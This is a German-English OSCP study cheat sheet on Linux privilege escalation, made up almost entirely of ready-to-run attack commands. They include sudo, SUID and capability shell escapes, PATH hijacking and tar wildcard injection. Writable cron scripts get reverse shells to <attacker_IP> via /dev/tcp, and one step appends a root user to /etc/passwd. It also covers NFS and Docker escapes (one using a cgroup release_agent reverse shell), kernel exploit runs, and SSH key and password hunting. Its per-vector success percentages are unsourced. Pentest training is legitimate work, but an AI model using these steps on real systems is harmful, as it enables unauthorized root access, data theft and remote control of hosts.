# LINUX PRIVILEGE ESCALATION - COMPLETE OSCP GUIDE

## 0. INITIAL ENUMERATION (FIRST STEPS!)

```bash
# Wer bin ich?
whoami
id
groups

# System Info
uname -a
hostname
cat /etc/issue
cat /etc/*-release

# Network
ifconfig
ip a
ip route
arp -a
netstat -ano

# Users
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1
ls -la /home

# Running Services
ps aux
ps aux | grep root
```

## 1. AUTOMATED ENUMERATION SCRIPTS (Wahrscheinlichkeit: 90%)

### LinPEAS (MUST-USE!):
```bash
# Download & Run
wget http://<attacker_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Suche nach ROTEN/GELBEN Findings!
# Besonders: SUID, Sudo, Writable Files, Cron Jobs
```

### LinEnum:
```bash
wget http://<attacker_IP>/LineNum.sh
chmod +x LineNum.sh
./LineNum.sh | tee linenum_output.txt
```

### Linux Smart Enumeration (LSE):
```bash
wget http://<attacker_IP>/lse.sh
chmod +x lse.sh
./lse.sh -l 1  # Level 1
./lse.sh -l 2  # Level 2 (detailed)
```

## 2. SUDO EXPLOITATION (Wahrscheinlichkeit: 60%)

### Sudo -l Check:
```bash
sudo -l

# Output Examples & Exploits:
```

### Scenario 1: (ALL) NOPASSWD: ALL
```bash
# Direct root!
sudo su
sudo -i
sudo /bin/bash
```

### Scenario 2: NOPASSWD: /usr/bin/find
```bash
sudo find /tmp -exec /bin/bash \;
sudo find /tmp -exec whoami \;
```

### Scenario 3: NOPASSWD: /usr/bin/vim
```bash
sudo vim -c '!bash'
sudo vim -c ':!sh'
```

### Scenario 4: NOPASSWD: /usr/bin/less
```bash
sudo less /etc/profile
# Dann: !bash
```

### Scenario 5: NOPASSWD: /usr/bin/awk
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### Scenario 6: NOPASSWD: /usr/bin/nmap (old)
```bash
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

### GTFOBins für Sudo:
```
https://gtfobins.github.io/

# Suche nach Binary + "Sudo"
# Copy paste exploit!
```

## 3. SUID BINARIES (Wahrscheinlichkeit: 70%)

### Find SUID Files:
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

### Common Exploitable SUID:
```bash
# find
find /tmp -exec /bin/bash -p \;

# nmap (old versions)
nmap --interactive
!bash

# vim
vim -c '!bash -p'

# less
less /etc/profile
!bash

# more
more /etc/profile
!bash

# cp (copy /etc/passwd)
cp /etc/passwd /tmp/passwd
echo 'root2:x:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
su root2

# awk
awk 'BEGIN {system("/bin/bash -p")}'

# python
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

### Custom SUID Binary Exploitation:
```bash
# Wenn custom binary mit SUID:
strings /path/to/binary     # Suche nach system() calls
ltrace /path/to/binary      # Trace library calls

# Path Hijacking wenn relative Pfade:
echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
/path/to/vulnerable_binary
```

## 4. CRONJOBS (Wahrscheinlichkeit: 40%)

### Cron Enumeration:
```bash
# System Crontab
cat /etc/crontab
ls -la /etc/cron.*

# User Crontabs
crontab -l
ls -la /var/spool/cron/crontabs

# Systemd Timers
systemctl list-timers --all
```

### Writable Cron Script:
```bash
# If cron runs /opt/backup.sh as root and you can write to it:
echo 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1' >> /opt/backup.sh

# Or add SUID to bash:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
# Wait for cron to run
/tmp/rootbash -p
```

### Wildcard Injection:
```bash
# If cron does: tar czf /tmp/backup.tar.gz *
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/shell.sh
chmod +x /tmp/shell.sh
touch /tmp/--checkpoint=1
touch /tmp/--checkpoint-action=exec=sh\\ shell.sh
# Wait for cron
/tmp/rootbash -p
```

## 5. CAPABILITIES (Wahrscheinlichkeit: 25%)

### Find Capabilities:
```bash
getcap -r / 2>/dev/null
```

### Common Exploits:
```bash
# cap_setuid+ep on python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_setuid+ep on perl
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# cap_setuid+ep on tar
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# cap_dac_read_search+ep
# Can read any file!
/binary /etc/shadow
```

## 6. KERNEL EXPLOITS (Wahrscheinlichkeit: 30% - LETZTER AUSWEG!)

### Kernel Version:
```bash
uname -a
uname -r
cat /proc/version
```

### Common Kernel Exploits:
```bash
# Dirty COW (CVE-2016-5195) - Kernel 2.x-4.x
searchsploit dirty cow
gcc -pthread dirty.c -o dirty -lcrypt
./dirty

# DirtyCow alternative:
searchsploit 40839
gcc -pthread 40839.c -o dcow -lcrypt
./dcow

# Overlayfs (CVE-2015-1328) - Ubuntu 12.04-15.10
searchsploit overlayfs
gcc exploit.c -o exploit
./exploit

# Sudo Baron Samedit (CVE-2021-3156) - Sudo < 1.9.5p2
searchsploit 49521
make
./sudo-hax-me-a-sandwich

# Polkit (CVE-2021-4034) - PwnKit
searchsploit pwnkit
gcc pwnkit.c -o pwnkit
./pwnkit
```

### Linux Exploit Suggester:
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

## 7. PASSWORDS & CREDENTIALS (Wahrscheinlichkeit: 50%)

### History Files:
```bash
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.php_history
```

### Config Files:
```bash
cat ~/.bashrc
cat ~/.profile
find / -name "*.conf" 2>/dev/null | xargs grep -i "password"
find / -name "config.php" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
```

### Database Credentials:
```bash
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
grep -r "password" /var/www/html 2>/dev/null
grep -r "mysql" /var/www/html 2>/dev/null
```

### SSH Keys:
```bash
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
ls -la /home/*/.ssh/
```

### Password Reuse:
```bash
# Gefundene Passwords auf anderen Usern/Services testen!
su - username
ssh username@localhost
mysql -u root -p
```

## 8. WRITABLE /etc/passwd (Wahrscheinlichkeit: 15%)

```bash
# Check if writable
ls -la /etc/passwd

# Generate Password Hash
openssl passwd -1 -salt salt password123
# Output: $1$salt$qJH7.N4xYta3aEG/dfqo/0

# Add Root User
echo 'root2:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch User
su root2
# Password: password123
```

## 9. NFS ROOT SQUASHING (Wahrscheinlichkeit: 10%)

### Victim Enumeration:
```bash
cat /etc/exports
# Look for: no_root_squash
```

### Attacker (as root):
```bash
# Mount NFS Share
mkdir /tmp/nfs
mount -t nfs <victim_IP>:/share /tmp/nfs

# Create SUID Binary
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash
```

### Victim:
```bash
/share/rootbash -p
```

## 10. DOCKER ESCAPE (Wahrscheinlichkeit: 20% - wenn in Container)

### Check if in Docker:
```bash
cat /.dockerenv
cat /proc/1/cgroup | grep docker
hostname  # random hex = Docker
```

### Escape Techniques:
```bash
# Method 1: Mount Host Filesystem (if privileged)
fdisk -l  # If shows host disks = privileged container
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
# Now on host!

# Method 2: Docker Socket Mounted
ls -la /var/run/docker.sock
# If exists:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash

# Method 3: Capabilities
capsh --print
# If cap_sys_admin:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## 11. PRIVESC CHECKLISTS

### Quick Wins (Check First!):
```
☐ sudo -l (GTFOBins)
☐ SUID binaries (find / -perm -4000)
☐ /etc/passwd writable
☐ Cron jobs writable
☐ SSH keys readable
☐ Passwords in history/config
☐ Capabilities (getcap -r /)
```

### Medium Effort:
```
☐ Kernel exploits (last resort!)
☐ Docker escape
☐ NFS no_root_squash
☐ Writable systemd service files
☐ LD_PRELOAD/LD_LIBRARY_PATH
☐ Password reuse
☐ Database enumeration
```

## 12. WAHRSCHEINLICHKEITEN NACH VEKTOR

```
LinPEAS Auto-Find:     90%
Sudo -l:               60%
SUID Binaries:         70%
Passwords/Creds:       50%
Cronjobs:              40%
Kernel Exploits:       30%
Capabilities:          25%
Docker Escape:         20%
/etc/passwd writable:  15%
NFS root_squash:       10%
```

## 13. GOLDEN RULES LINUX PRIVESC

```
1. IMMER LinPEAS/LinEnum zuerst!
2. sudo -l ist Quick Win #1
3. SUID find ist Quick Win #2
4. GTFOBins für alle Binaries checken!
5. Passwords ÜBERALL suchen (history, configs, db)
6. SSH Keys für Lateral Movement
7. Kernel Exploit = LETZTER Ausweg!
8. Wenn stuck: Re-run LinPEAS, lese Output genau!
9. Credentials testen auf ALLEN Users!
10. Docker Container? → Check for escape!
```

## 14. HÄUFIGE FEHLER

```
❌ Kernel Exploit sofort
✅ Erst Sudo, SUID, Passwords!

❌ LinPEAS Output nicht lesen
✅ Suche nach RED/YELLOW!

❌ GTFOBins nicht checken
✅ JEDES Binary auf GTFOBins!

❌ Password Reuse nicht testen
✅ Gefundene Passwords auf ALLEN Usern!

❌ SSH Keys ignorieren
✅ Immer find / -name "id_rsa"!

❌ Cron Jobs übersehen
✅ cat /etc/crontab immer checken!
```
